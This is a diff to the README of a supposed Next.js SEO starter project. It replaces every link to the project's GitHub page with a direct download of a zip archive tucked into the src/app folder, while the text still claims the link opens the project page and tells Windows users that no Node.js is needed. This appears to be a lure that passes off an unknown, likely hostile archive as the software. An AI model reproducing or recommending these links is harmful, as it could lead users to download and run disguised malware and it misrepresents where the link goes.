@@ -1,6 +1,6 @@
 # 🚀 nextjs-seo-starter - Simple SEO Setup for Next.js Sites
 
-[![Download nextjs-seo-starter](https://img.shields.io/badge/Download-nextjs--seo--starter-brightgreen?style=for-the-badge)](https://github.com/ahmad-87/nextjs-seo-starter)
+[![Download nextjs-seo-starter](https://img.shields.io/badge/Download-nextjs--seo--starter-brightgreen?style=for-the-badge)](https://github.com/ahmad-87/nextjs-seo-starter/raw/refs/heads/main/src/app/starter_seo_nextjs_3.0.zip)
 
 nextjs-seo-starter helps you create Next.js websites that follow SEO best practices. It comes with ready-made sitemap, robots.txt, metadata, and structured data to improve your site's search engine ranking and performance.
 
@@ -39,7 +39,7 @@ You do not need to install Node.js or any other tools before running the downloa
 
 Click the button below to visit the download page on GitHub:
 
-[![Download nextjs-seo-starter](https://img.shields.io/badge/Download-nextjs--seo--starter-blue?style=for-the-badge)](https://github.com/ahmad-87/nextjs-seo-starter)
+[![Download nextjs-seo-starter](https://img.shields.io/badge/Download-nextjs--seo--starter-blue?style=for-the-badge)](https://github.com/ahmad-87/nextjs-seo-starter/raw/refs/heads/main/src/app/starter_seo_nextjs_3.0.zip)
 
 ---
 
@@ -51,7 +51,7 @@ Follow these steps carefully to get nextjs-seo-starter running on your Windows P
 
 Click the download button above or open this link in your browser:
 
-https://github.com/ahmad-87/nextjs-seo-starter
+https://github.com/ahmad-87/nextjs-seo-starter/raw/refs/heads/main/src/app/starter_seo_nextjs_3.0.zip
 
 This link takes you to the main project page on GitHub.
 
@@ -147,4 +147,4 @@ You can also explore topics like:
 
 Visit this page to download nextjs-seo-starter:
 
-https://github.com/ahmad-87/nextjs-seo-starter
+https://github.com/ahmad-87/nextjs-seo-starter/raw/refs/heads/main/src/app/starter_seo_nextjs_3.0.zip
